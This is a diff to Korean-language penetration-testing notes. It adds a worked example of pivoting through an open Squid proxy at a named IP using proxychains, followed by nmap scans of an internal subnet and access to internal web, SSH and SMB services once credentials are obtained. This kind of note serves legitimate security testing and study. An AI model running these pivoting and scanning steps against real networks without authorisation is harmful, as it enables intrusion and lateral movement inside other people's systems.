@@ -161,7 +161,36 @@ proxychains4 nmap -sT -Pn -p 80,443 <target>   # -sT (TCP connect) 사용
 # 프록시 설정에서 CONNECT 허용 확인
 ```
 
-## 11. 관련 도구
+## 11. 현재 상황 활용 예시 (Squid 프록시 피벗)
+
+대상: 192.168.199.189 (Squid 3128 오픈, 80/443 닫힘). 프록시를 통해 내부망으로 피벗.
+
+```bash
+# 1) proxychains 설정 (Squid를 HTTP 프록시로 등록)
+sudo sed -i 's/^# dynamic_chain/dynamic_chain/' /etc/proxychains4.conf
+echo "http 192.168.199.189 3128" | sudo tee -a /etc/proxychains4.conf
+grep -v '^#' /etc/proxychains4.conf | grep -v '^$'
+
+# 2) 프록시 동작 확인
+proxychains4 curl -s http://ifconfig.me
+
+# 3) 내부망 호스트/포트 스캔 (TCP connect만 가능)
+proxychains4 nmap -sT -Pn -p 22,80,443,445,3389 10.0.0.0/24
+
+# 4) 내부 웹 서비스 접근
+proxychains4 curl -s http://10.0.0.5/
+
+# 5) 내부 SSH 접근
+proxychains4 ssh user@10.0.0.5
+
+# 6) 내부 SMB 접근 (creds 획득 후)
+proxychains4 smbclient //10.0.0.5/share -U user%pass
+```
+
+- nmap은 반드시 `-sT` (TCP connect) 사용. SYN 스캔(`-sS`)은 raw socket이라 프록시 통과 불가.
+- Squid가 CONNECT를 허용하지 않으면 HTTPS/비HTTP 포트 접근 실패. Squid 설정 확인.
+
+## 12. 관련 도구
 
 - chisel: HTTP 터널, 방화벽 우회에 강함
 - ligolo-ng: TUN 인터페이스 피벗, nmap SYN 스캔 가능 (raw)
